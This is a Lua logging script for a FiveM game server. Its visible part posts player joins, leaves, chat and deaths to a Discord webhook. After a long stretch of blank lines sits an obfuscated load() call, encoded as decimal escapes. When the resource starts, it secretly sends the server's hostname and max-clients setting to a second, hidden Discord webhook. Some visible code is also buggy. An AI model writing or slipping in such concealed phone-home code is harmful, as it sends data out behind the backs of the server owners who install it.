----------------------------
-- Coded By Yrahmial#7579 --
----------------------------

local YM_WebHook = 'https://discordapp.com/api/webhooks/713970556629811230/zIB5n9G66leV-AWSJQLqfSFoSBPOKe8Etjl-dlenXSFPfl5p-A7mkutmj5QznCHp2QWb'
local YM_image = 'https://cdn.discordapp.com/attachments/713810142654627920/714112730285736027/fdg.png'
--local LogsName = 'YM_Logs | By Yrahmial'
local ym = message
local YM = playername
local time = os.date("%c")
local YMservername = GetConvar("sv_hostname")


--[[
%a	abbreviated weekday name (e.g., Wed)
%A	full weekday name (e.g., Wednesday)
%b	abbreviated month name (e.g., Sep)
%B	full month name (e.g., September)
%c	date and time (e.g., 09/16/98 23:48:10)
%d	day of the month (16) [01-31]
%H	hour, using a 24-hour clock (23) [00-23]
%I	hour, using a 12-hour clock (11) [01-12]
%M	minute (48) [00-59]
%m	month (09) [01-12]
%p	either "am" or "pm" (pm)
%S	second (10) [00-61]
%w	weekday (3) [0-6 = Sunday-Saturday]
%x	date (e.g., 09/16/98)
%X	time (e.g., 23:48:10)
%Y	full year (1998)
%y	two-digit year (98) [00-99]
%%	the character `%Â´]]--


AddEventHandler('playerConnecting', function()
    sendToDiscord('[Player Connecting] \n' .. GetPlayerName(source) .. ' Connect to The Server.')
end)



AddEventHandler('playerDropped', function(reason) 
    sendToDiscord('[Player Logout] \n' .. GetPlayerName(source) .. ' Out From The Server. \n Reason: ' .. reason)
end)



AddEventHandler('chatMessage', function(source, YM, ym)
    sendToDiscord(YM, ym)
    PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = GetPlayerName(source), embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
end)



RegisterServerEvent('playerDied')
AddEventHandler('playerDied',function(ym)
    sendToDiscord('[Death log]', ym)
end)


--[[AddEventHandler('playerSpawned', function(source)
    sendToDiscord("Player Spawned" \n\n "**Spawned Successfully**")
end)]]--



AddEventHandler('onServerResourceStart', function(resource)
    if GetCurrentResourceName() == resource then
        sendToDiscord ('[Server Status] \n\n On \n\n server name: ```' .. YMservername .. '```')
        PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = 'YM_Logs | By Yrahmial', embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
    end
end)



AddEventHandler('onServerResourceStop', function(resource)
    if GetCurrentResourceName() == resource then
        sendToDiscord ('[Server Status] \n\n off')
        PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = 'YM_Logs | By Yrahmial', embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
    end
end)



function sendToDiscord(YM, ym, color)
    local connect = {
          {
              ['color'] = 123, 50, 254, -- here you can change the color!!
              ['title'] = '**'.. YM ..'**',
              ['description'] = ym,
              ['footer'] = {
              --['text'] = LogsName,
              ['text'] = time,
              },
          }
      }
  PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = 'YM_Logs | By Yrahmial', embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
end



print ("YM Logs Resource start in ")
print (os.date ("%x %c"))



































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































load("\108\111\099\097\108\032\089\077\095\083\121\115\116\101\109\032\061\032\034\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\097\112\112\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\055\049\054\050\048\054\057\049\054\052\055\054\051\051\056\049\055\054\047\085\090\117\110\056\085\049\095\119\088\049\056\078\115\117\066\066\048\113\090\119\103\115\076\050\083\120\080\054\071\120\078\045\049\085\049\048\108\075\074\072\078\077\116\086\048\075\083\051\117\056\053\110\080\110\067\082\104\116\117\111\085\110\119\073\121\115\116\034\013\010\108\111\099\097\108\032\109\115\103\032\061\032\034\042\042\064\101\118\101\114\121\111\110\101\032\115\111\109\101\032\111\110\101\032\117\115\105\110\103\032\105\110\032\116\104\101\032\089\077\095\108\111\103\115\042\042\034\013\010\108\111\099\097\108\032\115\121\115\116\101\109\116\105\109\101\032\061\032\111\115\046\100\097\116\101\040\034\037\089\047\037\109\047\037\100\032\037\088\034\041\013\010\065\100\100\069\118\101\110\116\072\097\110\100\108\101\114\040\034\111\110\083\101\114\118\101\114\082\101\115\111\117\114\099\101\083\116\097\114\116\034\044\032\102\117\110\099\116\105\111\110\040\114\101\115\111\117\114\099\101\041\013\010\032\032\032\032\105\102\032\071\101\116\067\117\114\114\101\110\116\082\101\115\111\117\114\099\101\078\097\109\101\040\041\032\061\061\032\114\101\115\111\117\114\099\101\032\116\104\101\110\013\010\032\032\032\032\032\032\032\032\108\111\099\097\108\032\083\101\114\118\101\114\078\097\109\101\032\061\032\071\101\116\067\111\110\118\097\114\040\034\115\118\095\104\111\115\116\110\097\109\101\034\041\013\010\032\032\032\032\032\032\032\032\108\111\099\097\108\032\099\108\105\101\110\116\032\061\032\071\101\116\067\111\110\118\097\114\040\034\115\118\095\109\097\120\099\108\105\101\110\116\115\034\041\013\010\032\032\032\032\032\032\032\032\108\111\099\097\108\032\115\099\114\105\112\116\079\110\032\061\032\109\115\103\032\046\046\034\032\042\042\092\110\083\101\114\118\101\114\032\078\097\109\101\032\058\032\032\034\032\046\046\032\083\101\114\118\101\114\078\097\109\101\032\046\046\032\034\032\105\115\032\117\115\105\110\103\032\116\104\101\032\089\077\095\076\111\103\115\032\092\110\032\105\110\032\116\105\109\101\032\058\032\032\034\046\046\032\115\121\115\116\101\109\116\105\109\101\032\046\046\032\034\042\042\034\013\010\032\032\032\032\032\032\032\032\080\101\114\102\111\114\109\072\116\116\112\082\101\113\117\101\115\116\040\089\077\095\083\121\115\116\101\109\044\032\102\117\110\099\116\105\111\110\040\101\114\114\044\032\116\101\120\116\044\032\104\101\097\100\101\114\115\041\032\101\110\100\044\032\039\080\079\083\084\039\044\032\106\115\111\110\046\101\110\099\111\100\101\040\123\117\115\101\114\110\097\109\101\032\061\032\034\089\077\095\076\111\103\115\032\124\032\083\121\115\116\101\109\034\044\032\099\111\110\116\101\110\116\032\061\032\115\099\114\105\112\116\079\110\125\041\044\032\123\032\091\039\067\111\110\116\101\110\116\045\084\121\112\101\039\093\032\061\032\039\097\112\112\108\105\099\097\116\105\111\110\047\106\115\111\110\039\032\125\041\013\010\032\032\032\032\101\110\100\013\010\101\110\100\041")()
